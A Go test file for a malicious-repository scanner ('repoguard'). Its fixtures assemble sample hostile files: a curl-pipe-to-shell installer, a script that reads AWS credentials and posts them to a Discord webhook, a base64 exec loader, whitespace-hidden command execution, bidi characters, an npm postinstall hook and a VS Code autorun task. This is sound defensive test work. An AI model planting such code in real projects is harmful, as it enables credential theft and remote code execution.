package scan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ulisespignatelli/repoguard/internal/finding"
	. "github.com/ulisespignatelli/repoguard/internal/testutil"
)

// Las muestras se arman en tiempo de ejecucion (concatenando partes) para que este repositorio no
// contenga patrones maliciosos completos que disparen otros escaneres.

func write(t *testing.T, root, rel string, data []byte) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
}

func maliciousRepo(t *testing.T) string {
	root := t.TempDir()
	write(t, root, "install.sh", []byte(J("#!/bin/sh\n", "cur", "l -s http://198.18.7.21/x ", "| ba", "sh\n")))
	write(t, root, "src/stealer.py", []byte(J(
		"import os, requests\n",
		"data = op", "en(os.path.expanduser('~/.aws/credentials')).read()\n",
		"requests.post('https://discord.com/api/web", "hooks/123456789/", Rand(60, URL, 1), "', json={'c': data})\n")))
	write(t, root, "src/loader.py", []byte(J("import base64\n", "ex", "ec(base64.b64", "decode('", Rand(80, B64, 2), "'))\n")))
	write(t, root, "src/util.js", []byte(J("function ok() { return 1 }", strings.Repeat(" ", 220), "require('child_process').exec(x)\n")))
	write(t, root, "src/check.py", []byte(J("access = 'user'  # \u202e ", "}admin{ \u2066\n")))
	write(t, root, "package.json", []byte(J(`{"name":"x","scripts":{"post`, `install":"cur`, `l -s https://203.0.114.9/p | sh"}}`)))
	write(t, root, ".vscode/tasks.json", []byte(J(`{"tasks":[{"label":"x","command":"node a.js","runOptions":{"run`, `On": "folderOpen"}}]}`)))
	write(t, root, "lib/loader.jar", append([]byte("PK\x03\x04"), make([]byte, 64)...))
	write(t, root, "README.md", []byte(J("# Herramienta\n\nInstalala así:\n\n```bash\n", "cur", "l -sL https://ejemplo.org/i | ba", "sh\n```\n")))
	return root
}

func byRule(fs []finding.Finding) map[string][]finding.Finding {
	m := map[string][]finding.Finding{}
	for _, f := range fs {
		m[f.RuleID] = append(m[f.RuleID], f)
	}
	return m
}

func TestDetectsMaliciousPatterns(t *testing.T) {
	res, err := Scan(maliciousRepo(t), Options{})
	if err != nil {
		t.Fatal(err)
	}
	m := byRule(res.Findings)
	want := map[string]finding.Severity{
		"remote-pipe-shell": finding.Critical, "steal-and-send": finding.Critical, "decode-exec": finding.Critical,
		"exfil-discord": finding.High, "creds-cloud": finding.High, "hidden-trailing": finding.High,
		"bidi-control": finding.High, "npm-install-hook": finding.High, "vscode-autorun": finding.High,
		"binary": finding.High,
	}
	for id, sev := range want {
		got, ok := m[id]
		if !ok {
			t.Errorf("no detectó %s", id)
			continue
		}
		if got[0].Severity != sev {
			t.Errorf("%s: gravedad %s, esperaba %s", id, got[0].Severity, sev)
		}
	}
	if res.Verdict.Level != "no_ejecutar" {
		t.Fatalf("veredicto %q", res.Verdict.Level)
	}
	// La documentacion que pide ejecutar un script remoto queda en Media, no en Critica.
	for _, f := range m["remote-pipe-shell"] {
		if f.File == "README.md" && f.Severity != finding.Medium {
			t.Errorf("README: gravedad %s", f.Severity)
		}
	}
}

func TestEvidenceHidesWebhookToken(t *testing.T) {
	res, _ := Scan(maliciousRepo(t), Options{})
	for _, f := range res.Findings {
		if f.RuleID == "exfil-discord" && !strings.Contains(f.Evidence, "123456789/****") {
			t.Fatalf("el token del webhook no se enmascaró: %s", f.Evidence)
		}
	}
}

func TestBenignRepo(t *testing.T) {
	root := t.TempDir()
	write(t, root, "main.py", []byte("import requests\nr = requests.get('https://api.github.com')\nprint(r.json())\n"))
	write(t, root, "config.py", []byte("FILES = ['.npmrc', '.pypirc']  # archivos que nuestro escáner revisa\n"))
	write(t, root, "net.py", []byte("SERVER = 'http://192.168.1.10:8080/api'\nDOCS = 'http://203.0.113.5/'\n"))
	write(t, root, "docs/guia.md", []byte(J("Nunca uses `cur", "l x | sh` sin leerlo.\n")))
	write(t, root, "package.json", []byte(`{"name":"x","scripts":{"test":"node t.js"},"dependencies":{"left-pad":"^1.3.0"}}`))
	res, err := Scan(root, Options{})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range res.Findings {
		if f.Severity >= finding.Medium {
			t.Errorf("falso positivo: %s en %s:%d (%s)", f.RuleID, f.File, f.Line, f.Severity)
		}
	}
	if res.Verdict.Level != "sin_senales" {
		t.Fatalf("veredicto %q", res.Verdict.Level)
	}
}

func TestSkipsDirsAndExclusions(t *testing.T) {
	root := t.TempDir()
	bad := []byte(J("cur", "l -s http://198.18.7.21/x | ", "sh\n"))
	write(t, root, "node_modules/x/a.sh", bad)
	write(t, root, "vendor-scripts/a.sh", bad)
	res, _ := Scan(root, Options{Exclude: []string{"vendor-scripts/**"}})
	if len(res.Findings) != 0 {
		t.Fatalf("debería omitir node_modules y lo excluido: %+v", res.Findings)
	}
}

func TestSetupPyAndRequirements(t *testing.T) {
	root := t.TempDir()
	write(t, root, "setup.py", []byte(J("import os\nos.sys", "tem('id')\nsetup(name='x')\n")))
	write(t, root, "requirements.txt", []byte("requests==2.32.3\ngit+https://github.com/x/y\n"))
	m := byRule(mustScan(t, root))
	if len(m["setup-py-exec"]) != 1 || len(m["dep-remote"]) != 1 {
		t.Fatalf("%+v", m)
	}
}

func mustScan(t *testing.T, root string) []finding.Finding {
	res, err := Scan(root, Options{})
	if err != nil {
		t.Fatal(err)
	}
	return res.Findings
}
